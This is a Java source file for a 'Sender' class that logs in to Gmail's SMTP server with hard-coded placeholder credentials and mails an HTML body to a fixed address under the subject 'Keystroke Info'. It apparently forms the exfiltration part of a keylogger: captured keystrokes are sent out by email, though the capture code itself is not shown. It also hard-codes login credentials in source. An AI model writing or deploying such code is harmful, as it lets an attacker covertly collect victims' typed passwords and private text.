package handlers;

import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;
import java.util.Properties;

public class Sender {

    private Sender() {}

    private static final String SENDERS_GMAIL = "test@gmail.com";
    private static final String SENDERS_PASSWORD = "password";
    private static final String RECIEVERS_EMAIL = "test@gmail.com";
    private static Properties mailServerProperties;
    private static Session mailSession;
    private static MimeMessage mailMassage;

    public static void sendMail(String emailBody) throws Throwable {
        mailServerProperties = System.getProperties();
        mailServerProperties.put("mail.smtp.port", 587);
        mailServerProperties.put("mail.smtp.auth", "true");
        mailServerProperties.put("mail.smtp.starttls.enable", "true");

        mailSession = Session.getDefaultInstance(mailServerProperties);
        mailMassage = new MimeMessage(mailSession);
        mailMassage.addRecipients(MimeMessage.RecipientType.BCC, String.valueOf(new InternetAddress(RECIEVERS_EMAIL)));
        mailMassage.setSubject("Keystroke Info");
        mailMassage.setContent(emailBody, "text/html");

        Transport transport = mailSession.getTransport("smtp");
        transport.connect("smtp.gmail.com", SENDERS_GMAIL, SENDERS_PASSWORD);
        transport.sendMessage(mailMassage, mailMassage.getAllRecipients());
        transport.close();
    }
}
